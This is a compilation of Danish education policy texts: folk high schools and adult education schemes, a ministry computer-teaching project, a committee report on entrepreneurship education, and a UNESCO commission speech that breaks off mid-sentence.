Attitudes to the folk high school The folk high school�s wish to promote this kind of �fitness for life� has however often placed it in a dilemma. In times of crisis and during the creation of the Danish welfare state after the Second World War, in the 1930s and in the new crises of the past twenty years, attitudes to the folk high school have pulled in two different directions. Some have wanted the folk high schools to provide more information and proper education - qualifying education, so that the unemployed and socially disadvantaged, with diplomas in their hands, can carve themselves a place in society after their stay at the high school. Others have wanted the folk high schools to function in these times as social institutions along the lines of treatment centres with therapy, alcohol detoxification and crisis aid of all kinds. "Day high schools" As unemployment has grown in Denmark, a quite new type of folk high school has grown up, the �day high school�, and a related one-year �labour market courses especially for unemployd women�, called P.47. Objectives Most of the courses at the day high schools last sixteen weeks or more, in most cases with thirty hours of teaching a week. The aim, as expressed in the Act on Day High Schools (No. 411, 1991 Chap. 3,) is to �strengthen the personal development of the participants and improve their potential as regards the labour market and the educational system�. At the same time it is stressed that the activities at a day high school include cultural, social, creative, aesthetic and handicraft pursuits. The objective is more to provide a setting for strengthening self-confidence and developing the desire to learn than to give the students particular qualifications and fields of knowledge - to create a teaching environment based on �the experience of the participants themselves�. These objectives are of course influenced by the anti-authoritarian educational theories that spread like wildfire over most of Europe and the USA in the wake of the youth revolution at the end of the 1960s. But the special form they took in Denmark has far deeper roots, both in the Danish folk high school and in the traditions of the early non-state girls� and women�s schools. Benefits In recent years there have been several surveys of how adult women have benefited from their time at these day high schools and labour market course schools. Some quotations can be used to illustrate this: �I�ve learnt an incredible amount about myself.� �For me it was great when I found out that I was very interested in electronics, and as I�ve said, it gave me an opportunity for further education and the courage to meet the future.� �I�d like to point out that the course gave me great self-confidence and the desire to get going with my education and later to look for work.� Learning for life The daughters' own investment There were of course male educationalists and school workers who, alongside the first generations of pioneering women educationalists with Zahle at their head, worked with the same ideas and experiments. But if we are to learn anything new from history, it is thought-provoking to see that it was the poorly educated women who were able to get the system working organizationally; and they were able to do so because, much of the way, they could work without the interference of the authorities. That was the advantage of the state�s failure to invest in its daughters. The women developed certain views on education and upbringing that became common ground in their many different schools. And they engaged well educated men to teach themselves and their pupils, but on the women�s own educational terms. One cannot say that they developed any actual theory. The theory was built up after the fact, so to speak, against the background of the practical experiments and inspired by those currents of the time and the country that could give their experiments spirit and perspective. The spirit of the age, and the inspiration from the German Pestalozzi, the Dane Fr�bel, the Frenchman Rousseau and the Dane Grundtvig were part and parcel of their intellectual baggage, and along with oral presentation and their own specific experience of teaching, their trump cards. Emancipation by way of active commitment These possibilities, and this emancipation, however, did not consist of what in the western world of the twentieth century has been associated with emancipation - that is, a personal liberation from socially binding feelings for the family, the church and the nation. The Christian faith and social responsibility towards country and family were a guiding principle in their everyday work. The aim was for women to commit themselves as active, useful, intellectually equal citizens, whether they were mothers or career women. Freedom to choose and personal growth In return women would gain the freedom to choose and the possibility of personal growth that had hitherto been the preserve of men. The movement's peaceful course The reasons why this movement had such a relatively peaceful course in Denmark were, first, that it took place within the private school system, which absorbed an overwhelming number of the country�s teenaged pupils; and secondly that it kept a low profile in the face of the turbulent political and gender-political movements and public debates that secularized the country and extended democracy during industrialization at the end of the nineteenth century; and thirdly that it maintained the liberal idea that there should be freedom for a great variety of different schools, large and small; and finally that this �feminized� educational tradition grew up in close harmony with, and to some extent in collaboration with, forces in the free folk high school movement.

'Folkeoplysning' as a concept originates in the religious and social movements of the 19th century which were inspired by the Danish philosopher, poet, educationalist and clergyman N.F.S. Grundtvig. The act on 'Folkeoplysning' (1991) 'Folkeh�jskoler' ("Folk High Schools") Non-residential 'folkeh�jskoler' Qualifying general education for adults Adult educational support (VUS) The initiative for the school forms mentioned here all originated in private initiatives from grassroot movements. Adult education (evening schools), associative life, 'folkeh�jskoler' ("folk high schools") and 'dagh�jskoler' (non-residential folkeh�jskoler) are still private and self-governing even though they do receive considerable public funding. The offers of general qualifying education for adults have now been taken over and are supervised by the public authorities. The act on 'Folkeoplysning' (1991) Adult education, sports and youth associations, youth clubs and the university extra-mural department have been grouped in one act which provides the guidelines for the local authorities' allocation of financialsupport to these activities. A local committee on Folkeoplysning draws up the more detailed regulations for the support so that it can be adapted to local conditions. The municipality is free to fix the total overall allocation, but it must allocate support to adult education and to activities for children and young people and to premises for sports and youth associations, clubs etc. Approx. 1 million adults each year take part in adult education. The students pay one third of the expenses themselves, while the local authorities pay the rest: approx. 450 million DKK a year. Around two thirds of all children and young people take part in an association or in another form of organized activity which is almost solely run by voluntary unpaid staff. The public support allocated to this kind of activity is estimated to amount to approx. 800 million DKK, to which should be added approx. 1 billion for premises. 'Folkeh�jskoler' ("Folk High Schools") Denmark has approx. 100 institutions of this kind, of which the oldest dates back to 1844 and the two youngest were established in 1991. Free schools These schools are private schools organized as private foundations which decide on the content and form of the teaching themselves. Aims The aims of these schools are expressed as follows in section 1 of the Act on 'Folkeh�jskoler': "The 'folkeh�jskoler' shall offer adult students (over 18 years of age) general education and may within the framework of this give individual subjects or subject groups an important place". The concept of "general education" means that the the aim of the schools is personal development: By means of the teaching and the daily social dealings with other people, the students shall have the possibility of expanding their understanding of society and human relations. As these schools do not hold any examinations or tests, the aim of the teaching becomes the personal growth, maturity and independence of the student. Establishment and approval A 'folkeh�jskole' is established by private initiators and can obtain public support when the Ministry of Education has approved 1) the statutes of the school, 2) the educational and administrative qualifications of the principal, 3) the suitability of the buildings for teaching and accomodation, as the 'folkeh�jskole' is a boarding school where the students and often several of the teachers are living, and 4) the teaching plan, as emphasis is laid on the general educational aim. The teaching As the individual school is free to arrange its own teaching, the offer of subjects is rather varying. Some schools focus on one individual subject-area, e.g. music, sports or arts and crafts. But the majority ofschools have a very varied offer of subjects which may comprise history, politics, literature, philosophy, cultural history or environmental issues. Courses and students The 'folkeh�jskole' offers long courses (of 5-32 weeks' duration) and short courses (of 1-4 weeks' duration). The average age of the students in the long courses is 22-23 years. In the short courses which in particular take place in the summer season, the age of the students is considerably higher. In 1990, there were a total of 13,500 students in the long courses and 44,000 in the short courses. Finance The courses are financed partly by student fees, partly by government support. In 1989, the student fees and the government support contributed with equal parts of the income, i.e. a total of 85%. The schools received the remaining 15% by renting out the buildings for other purposes. The government furthermore allocates an incomedetermined grant towards the students' payment for their participation in courses of a minumum duration of 2 weeks. In 1990, the government expenses for the schools and their students were as follows: Grants to the schools: 361 million DKK. Grants to the students: 106 million DKK. Non-residential 'folkeh�jskoler' These schools are institutions which offer 'folkeoplysning'. Their activities are particularly aimed at the unemployed. The offer of the schools comprises a broad range of activities - with both cultural, social, creative and aesthetic aspects. The teaching covers both general and vocationally oriented topics. In keeping with the close relation to the tradition of the 'folkeh�jskole', the education offered by these schools lays a special emphasis on the strengthening of the personal development of the students and on the enhancement of their possibilities of taking part in the labour market or the education system. The courses are normally of a duration of up to 16 weeks, but the schools also offer rather short introduction and guidance courses. The experience gained so far shows that approx. two thirds of the students get a job or start on a course of education when they leave the course. The non-residential 'folkeh�jskoler' are formally private foundations. All schools (approx. 145) receive financial support from public authorities of approx. DKK 175 million for 4200 annual places corresponding to about 10,000 students. It is possible for the students to receive social benefits (social security benefits, unemployment benefits etc.) during the course. Qualifying general education for adults General adult education (AVU) is an offer of qualifying education which provides adults with a possibility of supplementing and updating their general education and of sitting for examinations at a level corresponding to the final form levels (9th-l0th forms) of the Folkeskole. The subjects, curricula, the organization and examination forms are adapted to the needs and prerequisites of adults. The education provides general qualifications which can be used in connection with continued education in relation to working life or in social life. Finance The AVU is offered at the county adult education centres (the VUC). The county finances the education and supervises the teaching. There are about 75 adult education centres distributed all over the countr,v. The participation is free of charge - apart from a small registration fee. Range of subjects The subject range consists of 7 core subjects which are offered at all centres: Danish, mathematics, English, German, French, natural sciences and social studies. In addition to these subjects, the following subjects may be offered: Danish as a foreign language, philosophy, history, informatics, Latin, typing with electronic wordprocessing, media knowledge and psycholog,v. It is furthermore possible to arrange interdisciplinary introduction courses and other subject offers of local interest. All subjects have a centrally determined or approved curriculum and are completed by a State-controlled examination for adults. The subjects are offered on a single subject basis, and they are divided into modules. This enables the students to individually compose a course which corresponds to theirprerequisites and needs for qualifications. Each subject module comprises between 80 and 120 lessons and is typically arranged over a period of 12-16 weeks. The individual adult education centre is however free to adapt the organization of the course on the basis of noted needs - also with a view to starting time and the time of examinations. The education is very flexible which also makes it possible for the course to cooperate with the other adult education courses such as the non-residential 'folkeh�jskoler' and the labour market courses. Administration At each adult education centre, there is a centre council which in cooperation with the management of the centre decides on the offer of subjects, the number of lessons in the individual subjects and other matters pertaining to the operation. The centre council consists of representatives from the local labour market parties, the municipal and county authorities as well as from the students and teachers of the centre. Adult educational support (VUS) Act no. 336 of 24 May 1989 on adult educational support came into force on 1 October 1989. It is the aim of the act to create an economic basis which enables adults with a short education to take part in general and vocationally oriented education during working hours. The student is free to choose an educational offer which fits his own needs, and the act gives equal importance to general and vocationally oriented edncation Educational leave during working hours is agreed between the student and his employer. The target group of the VUS is salaried employees, self-employed persons and assisting spouses between 25 and 60 years of age with a short school education and/or vocational training background. The prerequisite for receiving support is that the applicant has had at least 6 months of employment in his present workplace. The educational support which is granted as a compensation for the loss of salary in connection with the participation in courses during working hours corresponds to the highest unemployment benefit which amounts to approx. 2,500 DKK per week. If the student is paid his ordinary salary during the course period, the amount of the educational support is refunded to the employer. VUS may be granted for teaching periods of 1-16 weeks' duration full time or correspondingly longer part-time teaching periods, but there must be a minimum number of 6 lessons per week. Since 1989, financial support has been granted to a total of approx. 6,500 students.

The Electronic School From 1995 to 1998 two Danish upper-secondary schools are carrying out a comprehensive development project on computer-based teaching. The project is called "The Electronic School" and Holstebro Upper-Secondary School as well as Nørresundby Upper-Secondary School are participating, with one class at each school. The project is to provide experience in using the most recent computer technology in teaching. Co-operation The project was implemented on the initiative of the Ministry of Education in co-operation with Teledanmark, IBM Denmark and Apple Computers. These firms have made sophisticated computer and communication equipment available to the two schools, among other things a laptop computer for each student in the two classes, as well as one for each of the class's teachers. In addition a number of software manufacturers have contributed computer programs for use in teaching. Through the co-operation of many parties, the framework has been established for a project that can produce exciting results not just within a Danish context, but in an international perspective as well. Aims and Objectives The project deals with school development as well as development in the educational sector, along with development in subject-specific and pedagogical areas. Through trying out state-of-the-art technology and software, the aim of the project is to gain experience concerning how the computer can be used to advantage in instruction -- both in the various subjects and in a more general pedagogical way. An equally important aim is to gain experience concerning how and when the computer should not be used. Expectations The project is expected to have great importance concerning how schools and instruction should be organised. On some points fairly major changes might be indicated, even in areas that are fundamental for teaching and for the learning process. It is vital that this development can take place on the basis of more than what is technically possible and that by means of experimentation opportunities will be created for evaluated the consequences of computer-based teaching and alternatives to it. What Is to Be Changed? The project involves all the subjects taught in the two classes, and in each subject the aim is to shed light on the needs and possibilities that developments in information technology provide in the following areas: changes in subject content changes in examinations changes in the organisation and arrangement of instruction as well as in teaching methods use of computer-based teaching material developing new teaching material giving teachers additional qualifications The Organisation of Instruction In particular substantial changes are expected in the way instruction is organised. The project can provide experience in the following areas: changes in the roles of students and teachers flexibility in instruction (time, place and content) process-orientated writing process-orientated pedagogy communication: among the students, between students and teachers, among the teachers themselves, between students and teachers at other schools in Denmark and abroad differentiated teaching use of the principles of remote teaching in an interplay with distributed teaching and classroom teaching importance of group or class feeling in relationship to individualisation Rational Use of Technology and Resources The project can provide experience and reveal problems that are relevant for working out a strategy for the rational use of technology and resources in the educational sector. Experience and problems concern both the process and the results on the following levels: individual and group levels institutional level (the school) local community level (the school as a technological resource centre, locally and regionally) national level (education generally in an interplay with outside factors) international level (interplay across borders, new forms of working together regionally and globally) Evaluation The participating teachers carry out continuous evaluation of the project in co-operation with the Ministry of Education's subject advisers, subject committees and outside experts. The Ministry attaches importance to disseminating the results of the project as widely as possible by making use of the experience at other upper-secondary schools and (to the extent that it is relevant) in the entire educational sector. The experience and results will be continuously made available through newsletters to other schools and to the public at large, through distance teaching for teachers at other schools as well as in actual project reports.

As the basis for its proposals, the committee has therefore supported its arguments by reference to on the one hand the experience gained by the educational institutions themselves and on the other hand to the experience gained in other countries. The committee therefore suggests that a study should be undertaken in 4 or 5 years' time about the experience gained with those proposals in this report which are adopted. The proportion of people employed within those occupations (agriculture and the liberal professions), which in the past led to the inclusion in a certain social and cultural environment, is decreasing. The social and family environments, in which a person grows up and by means of which the independence culture is continuously renewed, are therefore not either as widespread as they used to be. The long and the short of it is that young people today typically do not have parents who run their own businesses, and there are not very many among the parents' acquaintances either who have owned or own their own businesses. This - combined with the fact that the education system of today is generally directed at the creation of wage earners, and that teachers at Danish educational institutions do not necessarily feel entitled or obliged to indicate career or education and training alternatives - has resulted in a widespread wage earner culture. It is therefore a substantial task to make proposals for a global educational strategy in the entrepreneurial area. With a view to being in a position to make proposals for a global educational strategy with progression where new elements are all the time being built in top of each other, and where several considerations are furthered simultaneously, the committee has found it appropriate to distinguish between three cultural spheres: - The entrepreneurial culture which covers the occupational and educational background. - The innovation culture which comprises certain forms of co-operation, methods for problem-solving, the compilation of information, methods for self-learning, project management etc. - The independence culture, which refers to a number of broader personal qualities such as initiative, readiness when it comes to taking risks, decision-making, flexibility etc. The independence culture can be sought furthered and developed through initiatives, which are characterized by attitude and motivation, and in which the pedagogy is the central element. This may be done at all levels of the education system, and it is of decisive importance that it commences in the Folkeskole (primary and lower secondary school) in particular, as this is in a manner of speaking the place, where the groundwork is laid. Also the general parts of youth education, including the individually organised youth education, shall be inspired by this way of thinking. It is a recurrent feature in many foreign educational initiatives in the entrepreneurial area that the preparation of attitudes and the fact that the attention is being drawn to it are the altogether central elements. The innovation culture can be sought furthered through the development of good working practices, working methods etc. commencing as early as in vocationally oriented youth education and general upper secondary education and continuing in higher education. Also in this context is the pedagogy playing a rather central role, where it is among other things important to work with pupils and students as if they were collaborators in their own learning processes. The interaction in relation to the independence culture consists in the continuous development of personal qualities such as co-operation and communication skills, which are essential in project work and project management, parallel to the development of good working practices etc. The entrepreneurial culture can be sought furthered and developed through a combination of the more attitude-oriented initiatives inherent in the independence- and innovation culture and the more occupationally oriented initiatives. The occupationally oriented initiatives may comprise knowledge of economics, accounting, marketing, market analysis etc. which are some of the specific occupational qualifications which entrepreneurs typically express a need to know more about. It is decisive here that these elements are introduced with a practical approach and when possible also with an as great extent of occupational orientation as possible. It may therefore be natural to look at this type of initiative as a project, as project-related tasks or as concluding elements of a course of education or as elements in an adult education or continuing training programme. In this way, it is possible to create both coherence and progression so that the specific occupational qualifications are built on top of some already developed qualities and skills and some general organisational and managerial qualifications. In this way, the participants will be able to derive the greatest possible benefit from a target-oriented occupational learning which can only become target-oriented at this particular time. The report shows that some very interesting and promising initiatives are already in the process of being implemented at regional and local level as well as at the individual educational institutions. These initiatives typically draw on the knowledge and expertise which already exist at regional and local level. This knowledge and expertise is presumed to be used continuously and to be extended in co-operation with the educational institutions. With the point of departure in this overall concept, the proposals of the committee for a global educational strategy can be summed up and divided into the following 10 themes: a. Pedagogy b. Teaching materials and guidance c. In-service training of teachers d. Proposals within the existing framework e. Proposals for new courses of education f. Co-operation across institutional boundaries g. Co-operation between educational institutions and business and industry h. Right to continuing training as an entrepreneur i. Network formations j. Innovation and development funds. a. Pedagogy The acquisition of qualifications presumes that the individual pupil or student has a will and ability to develop. The acquisition and development of personal qualifications alone and in combination with occupational qualifications require that the pupil or student involves him- or herself in the learning process and processes the experience gained. The learner's active participation in the teaching process is at the centre irrespective of the level of education.Some principles of the learning may take their point of departure in the following five general pedagogical principles: 1. Determined by the participants who are responsible for their own learning, i.e. the learning process must as far as possible be initiated and determined by the learner him- or herself. 2. Problem-oriented, i.e. the participants work with real and realistic problems which motivate curiosity. 3. Experience-based, i.e. the learner's own experience must as far as possible be included in the teaching and be elaborated on in the learning process. 4 Differentiated teaching and personal style of learning, i.e. the learner is given the possibility to use his own way of learning in co-operation with others. 5. Project-oriented and interdisciplinary, i.e. the learner must be confronted with self-defined tasks, which cut across subjects and subject-areas. These general pedagogical principles place the learner - the pupil/student - at the centre of his or her own learning processes. These principles mean that the role of the teacher is changed so that he or she will now to a much greater extent get to function as a consultant and sparring partner to the learner. One must however also be aware of the fact that, although these principles are introduced from the very start of the schooling in the Folkeskole, they will be getting an increasing emphasis, as the learner assumes more and more responsibility for his or her own learning - also as an adult. This includes the working method and form of organisation in the very process by which the vocational qualifications are acquired. The ability to learn by oneself constitutes one of the very basic elements of the innovation culture, as this implies that the pupil/student must develop the ability to evaluate and make quality assessments. This also makes it possible for the pupil/student to become better at helping him/herself in the long term, irrespective of whether this implies a life as self-employed or not. b. Teaching materials and guidance The committee suggests: - that the guidance material from the National Council for Vocational and Educational Guidance (R.U.E.) is changed, and that it will among other things mention the subjects which may be of relevance to those who are contemplating the idea of becoming self-employed, - that the local educational institutions draw up curricula which include the entrepreneurial theme in the local timetable, - that teaching materials are used with examples based on small- and medium-sized businesses, where this is relevant, and that these examples must as far as possible be taken from Danish businesses, - that relevant teaching materials are developed at all levels of education, - that the teaching materials drawn up in the area of general upper secondary education are extended to also comprise teachers in vocational upper secondary education, as there is a great need there for material about entrepreneurs, which is target-oriented towards upper secondary education, and which is suitable for teaching purposes, and that it is contemplated to use for instance CD-ROM and electronic databases, as it must be possible to change and update such teaching material at regular intervals, and - that specific materials are drawn up for educational guidance officers in both general and vocational upper secondary education. The committee urges: - that the pupils are to be presented to cases/guest teachers/visits to business enterprises etc. which further their desire and motivation for a more independent attitude. It should therefore as far as possible be younger entrepreneurs who are used as guest teachers. The business enterprises used for visits should be small- and medium-sized businesses. It is important that the examples also represent women entrepreneurs so that both girls and boys can identify themselves with guest teachers as role-models. c. In-service training of teachers etc. The committee suggests: - that a special course supply is developed for new teachers in primary and lower secondary education, vocational education and training and upper secondary education, and - that already established computer-based networks are used so that the teachers are able to develop experience with teaching methods and cases, including the elaboration of a database on entrepreneurs. This network should also contain a survey of existing and former teachers who have or have had their own business, and who for that reason may be particularly well-qualified as "guest teachers". The network shall be maintained and the database extended at local level - at the individual schools, - that demands are made for a change in the teacher training offered at the National Institute for the Educational Training of Vocational Teachers so that this training will to a greater extent than is the case today qualify the teachers to develop the attitude potential of the students in connection with the learning, - that a greater awareness is created in the educator training programme with regard to the pedagogical principles etc. which further the development of children's general personal qualities, and - that the teacher training programme includes teaching in the independence culture and that special in-service training modules are developed for teachers. It is the committee's opinion that a pedagogical attitude must be created in upper secondary education in general to the use of teaching forms which are more activating for the participants. It would thus by means of pedagogical days be possible to work with independence culture and entrepreneurs so that the theme could be placed in a broader framework of understanding. Also in this context is it important that presentations are made by committed persons, and that the teachers are - through exercises - given the possibility to experience the independence on their own body. The committee urges: - that vocational school should as far as possible - when appointing temporarily employed teachers and permanently employed teachers and when organising teacher in-service training in accordance with the order on teacher qualifications - ensure that allowance is made for the teachers' function as advisors and sparring partners, - that institutions offering medium- and long-cycle higher education are to appoint external professors, co-finance the visits of prominent visiting professors from abroad and as far as possible make use of existing EU-programmes, and - that the need for development and for the compilation and dissemination of knowledge should be seen in relation to network formations - both among the teaching staff at the higher education institutions and between educational institutions and business and industry (cf. item g. below). d. Proposals within the existing framework The committee suggests: - that the new framework established in vocational upper secondary education for the planning of interdisciplinary teaching is used at local level, - that other relevant subjects such as social studies and technical studies shall be included in general upper secondary education on a par with business economics in the entrepreneurship teaching. It is the aim that all students who choose the optional subject of "business economics" shall get into contact with the entrepreneurial culture and be acquainted with the conditions of the entrepreneur, - that the present number of general upper secondary schools, which can take part in the European Business Game, should be increased, - that the vocational education and training programmes should, when this is relevant, comprise a project-oriented assignment, where the student performs a minor consultancy task for a business enterprise, which functions as the practical training place of the student, - that the students enrolled in social and health education programmes are provided with the possibility to work with projects regarding the setting up of their own businesses in connection with the ordinary project teaching, - that the individually organised youth education and the production schools are involved in the entrepreneurial area, for instance by placing workshop capacity at the students' disposal, - that national competitions are established, where students enrolled in relevant higher education programmes are competing against each other with regard to who can elaborate the best entrepreneurial and innovation projects, and - that credit-awarding entrepreneurial teaching is established in higher education, where the educational institutions themselves step in and support the development of such courses. The committee recommends that the framework provided by the Act on the Folkeskole for the organisation of an interdisciplinary and project-oriented working method is used at local level. The project working method, by which the work may result in individual or common presentations, may be carried out in several ways, e.g. - all pupils may work with the same theme and with a common problem formulation - all pupils may work with the same theme but with different problem formulations - each individual pupil may work with his or her own theme and his or her own problem formulation. e. Proposals for new courses of education The committee suggests: - that when drawing up new education orders a decision is taken on how the course can further the development of the innovative qualifications of the students, and on how the course can give the student knowledge about and an insight into how to start up a business enterprise, - to increase the effort with a view to developing a basic subject in entrepreneurship complete with teaching material in vocational education and training, - that the descriptions of aims and objectives, curricula etc. for all short-cycle higher education courses are given a tone of entrepreneurship and innovation, where it seems relevant to do so, - that an open evening school is established for entrepreneurs and others, where the teaching staff consist of young local entrepreneurs, - that special optional subjects or profile subjects are developed in the courses in market economics and export technology, - that interdisciplinary advanced courses are developed in immediate continuation of the short-cycle higher technical education courses, - that the possibility is considered of concluding relevant Bachelor-degree courses with a vocational introduction of six months' duration as a combination of a project assignment with practical training in a smaller or newly started business enterprise, - that a target-oriented pilot course is initiated for engineering students which is directed at product and process development, for instance in industrial innovation, - that the business schools establish a diploma course specialisation (HD-course) in entrepreneurship and innovation, - that a short-cycle higher education course is established in innovation and entrepreneurship according to the academy model.1 An Entrepreneurship and Innovation Academy will thereby be established, which may at the same time become a forum, where knowledge is compiled, which may subsequently be channelled back to the relevant educational institutions in a processed form. f. Co-operation across institutional boundaries The committee suggests: - that the vocational upper secondary schools should to a larger extent co-operate across institutional boundaries so that the different qualifications of the students enrolled in higher commercial examination and in higher technical examination courses are integrated into projects about for instance fictive simulation businesses or Young Enterprise, - that there is co-operation across institutional boundaries at local level between general upper secondary schools and vocational upper secondary schools, and that this co-operation also, where this may be relevant, involves schools responsible for vocational education and training and others with knowledge and expertise in the area at local or regional level, - that the higher education institutions show greater flexibility in their assessment of credit-awarding entrepreneurial courses, and - that it is stated in the certificates awarded to the students that they have completed an entrepreneurial course, even if no credits are awarded. g. Co-operation between educational institutions and business and industry The committee suggests: - that a "parent bank" consisting of good contacts to business and industry is established locally at primary and lower secondary schools, general upper secondary schools and vocational upper secondary schools. In the parent circle of the school, there are many good contacts which just need to be asked. It may therefore be a good activity to establish a network between teachers and parents in business and industry, - that a "business enterprise bank" consisting of contacts in business and industry wishing to take part in the different activities for teachers and students is established at general upper secondary schools and vocational upper secondary schools, - that guest teachers and contact persons in businesses are used more consciously at the individual schools, so that the good contacts in and to the individual teachers from business and industry can also be used by other teachers, - that vocational schools should function as experience centres for local entrepreneurs so that the schools can in this way contribute to creating an exciting environment of and for entrepreneurs. It should be made possible for local entrepreneurs to use existing workshop facilities etc. against payment for the development and testing of for instance prototypes, - that the trade committees, the local school boards and the local education committees are used as a point of departure for the search for and establishment of a "bank" consisting of businesses suitable for visits and guest teachers who can teach management studies and business operation, - that the trade committees, the management of the schools and the school boards should be constantly aware of affiliating newly started business enterprises, - that the small- and medium-size businesses, which the vocational schools are in contact with, should be able to approach the schools with problems and tasks which pupils and students are given as consultancy assignments as part of their course of study, and - that trade committees - when approving practical training places - take a decision on whether and how the practical training place can contribute to giving an insight into what it is all about to start and run one's own business. The committee recommends that the Ministry of Education takes the initiative to draw up - in co-operation with the Ministry of Business and Industry - a profile for how the co-operation between vocational schools and local business and industry can be implemented in this area. Such a co-operation should, if possible, lead to the elaboration of an inspiration report. It should furthermore be considered whether the Ministry of Education and the Ministry of Business and Industry should jointly - on application by the schools - award a prize or a special distinction to one or two schools, in those cases where the co-operation between a school and business and industry may stand out as an inspiration to other schools. h. Right to continuing training as an entrepreneur The committee suggests: - that anyone who has completed a vocational education and training course, an agricultural training course or a social and health education course at level 2 is entitled to an entrepreneurial course for up to 5 years after he or she has completed his or her education. A special "diploma" is awarded on completion of the course, and - that anyone who has completed a short-cycle higher education course and a relevant medium-cycle higher education course is entitled to a entrepreneurial course for up to 5 years after he or she has completed his or her education. i. Network formations It is the view of the committee that the model which is most likely to succeed consists in the establishment of three types of networks as part of a development process which may result in the establishment of some form of centre. The three types of networks comprise: the formation of networks between educational institutions, networks between teachers and researchers (cf. item j.) and networks for and between pupils/students enrolled in different courses of education. The committee therefore suggests: - that financial support is granted for the administration and organisation of interdisciplinary project modules in the form of a 50% co-financing with the educational institutions involved with a view to furthering co-operation between educational institutions, - that IT-based teaching is established in network contacts with other universities which are far advanced in the area. In this connection, the emphasis must be laid on technology-supported learning, e.g. distance learning, - that support is granted so that the developed Joint Project Manager and Innovation Course of the Higher Education Institutions ("Læreanstalternes Fælles Projektleder- og Innovationskursus" - the LFPI) can be taken up again and be offered at a number of other educational institutions, - that the experience and models developed within IT-based teaching are also made available to the vocational education and training and upper secondary education courses. This may be done as an integrated part of the in-service training course which has been proposed for teachers from these courses of education, - that the vocational schools, which find that there is a need to do so, create possibilities for the establishment of a network, where pupils and students can meet and exchange ideas and views. This may for instance be done by establishing "idea cafés", where persons with good ideas can meet and attend lectures, if any, and - that pupils and students at vocational schools, who grapple with plans of setting up their own businesses, should have the possibility to use the above network, but they should in particular have the possibility to use one or several specially trained teachers at the schools as advisors and sparring partners. It should also be possible to use the teaching staff of the vocational schools in the initial phase and the running-in phase, and this should be financed as an income-generating activity. The use of teaching staff at an educational institution, who are known to the pupils and students and with whom they are familiar, may also contribute to breaking the loneliness and isolation typically experienced by entrepreneurs. j. Innovation and development funds The committee suggests: - that interested schools within the social and health education sector carry out experiments with projects in the starting up of one's own business, - that innovation funding is set aside for the implementation of the teaching in entrepreneurship in the Folkeskole, - that experience, from the initiated development programmes, with interdisciplinary teaching and entrepreneurship both in vocational and general upper secondary education is used for a more target-oriented integration of the entrepreneurship theme in the teaching and for rendering it visible,- that innovation and development funds are set aside in higher education which teachers and researchers with an interest in entrepreneurship and innovation can apply for, so that they are among other things able to carry out study visits abroad and, if necessary, invite researchers from abroad to conferences etc. in Denmark. The funds should be used to support the teaching and the competence in innovation and entrepreneurship and make it possible to carry out experiments, and - that these innovation and development funds shall help the educational institutions involved to appoint visiting professors from abroad with expertise in the area in question for short-term employment. These funds can also be used in connection with the appointment of external professors. As a result of the committee's work, the committee hereby submits this report to the Minister of Education.

Education, always the object of aspirations and expectations concerning its contribution to the improvement of the human condition, has not escaped scrutiny of its role in preparing the actors of the coming century. In this context, and in keeping with the mission of UNESCO, Federico Mayor requested me in 1993 to chair an International Commission on Education for the Twenty-first Century. The Commission was composed of fifteen persons with a broad range of experience, competence, and cultural and professional backgrounds. Formally established at the beginning of 1993, it was mandated to study and reflect on the challenges facing education in the coming years, and to issue a report containing suggestions and recommendations that could serve as an agenda for renewal and action for policy-makers and officials at the highest levels. Although it was financed by UNESCO, and was able to draw on the rich experience and information available there, the Commission was completely independent in carrying out its work and in formulating its report. Today I should like to tell you in general terms something about the work and conclusions of the Commission, and make a few remarks concerning human resources in Europe. When we began our work, we were, naturally, aware that education has been the object of profound reflection and analysis for thousands of years. Thinkers of all civilizations have addressed their thoughts to the best ways of educating youth. Most of them have examined the very issues raised in our report. Thus, we did not, and could not, aim towards a complete break with the past. Rather, we wished to look at the relationship between education and society, at a time when humanity is facing a variety of new challenges and transformations, to provide an analysis that would enable educational systems to build on that past and at the same time propose keys for entry into the coming century. Our report, we felt, could provide an angle of vision through which to try to perceive the link between the past and the future, and a framework by which to look at what changes would be needed in educational thought and practice. Choices about education are choices about the kinds of societies we wish to build and to live in. These vary enormously, but they share some common features. Everywhere, there is a quest for a new vision of humanity that can help us live our increasing interdependence in a constructive way, that aims to enable each human being to live in dignity and in harmony with others. I. A look towards the future How can one look towards building a future that can, with some probability, emerge from today's reality, but that is at the same time not entirely dependent on today's constraints? Having worked for many years in forecasting and long-range planning, I am well placed to know the extreme limitations of trying to project ourselves into the future. As have most of you, I have had many opportunities to examine the gap between forecasts and what actually comes to pass. Still, we felt it necessary to look at today's dominant trends and to try to extract from them some lessons for the ways in which learning could be better organized in function of them. The world of today is dominated by globalization, but the advantages of this globalization in terms of communication, of scientific progress, of economic growth, have been far from equitably distributed. Rising unemployment and the exclusion of some groups from the benefits of social progress are striking in many developed economies. Inequalities of development, notably in access to education, to the resources of food, health and infrastructure necessary for a decent existence, are denied to hundreds of millions of people. According to the latest Human Development Report, half the inhabitants of our planet, more than three billion people, have incomes of less than two dollars a day. The World Summit for Social Development held just a year and a half ago here in Copenhagen provided an admirable analysis of the problems and furnished the countries a framework within which to work towards solutions. Yet, the conference last week in Stockholm provided another reminder of the tragedy of lost youth and endangered futures that are the lot of millions of our children. The hope for a better and more peaceful world held out by the end of the Cold War is yet to be real ized. In this context, we must confront a series of tensions that are not new, but that will be central to the problems of the twenty-first century. First, there is the tension between the global and the local: in order to participate in a global society, we must be capable of understanding our roots. We must be able to live together in the communities to which we naturally belong, in harmony with neighbours with whom we may or may not share a common language, history, religion, or view of the world. In a world in which information, ideas, and ways of doing things spread over the planet in a few months, days, or instants, each human being is challenged to adapt continuously in response to global change. At the same time, though, there is both a trend and a need for understanding and maintaining diversity. That is why we highlight the tension between the universal and the individual. Globalization brings with it the risk of diminishing the rich diversity among individuals, cultures, and traditions. Globalization of economic phenomena has been seen as helping in the emergence of a few dominant languages, cultural codes, and ways of behaviour. In reaction, and with the legitimate aim of protecting minority cultures, some groups can be tempted to reject even rights and values that have long been accepted as part of the universal human heritage. Finally, there is a tension between the spiritual and the material, which brings out the age-old search of each individual for moral ideals and values. This tension is much in evidence at a time when the benefits of material progress are seen to leave so many people behind. Against this backdrop of tensions, we chose three themes around which the role of education could be considered and reviewed. The first of these three is the emergence of a world society. This world society,however, is emerging from a collection of local communities. So, for education this means that understanding the world requires first of all understanding oneself, one's past and one's environment. This has always been true, but is even more important today. It will be imperative, in an interdependent world, to understand the forces that make this world interdependent, in order to learn to live in harmony with others. We are challenged more than ever to reinforce the links of co-operation and solidarity that are expressed in the United Nations system and in regional groupings and other international bodies. Indeed, the Director-General of UNESCO has placed particular emphasis on the relationship between education and 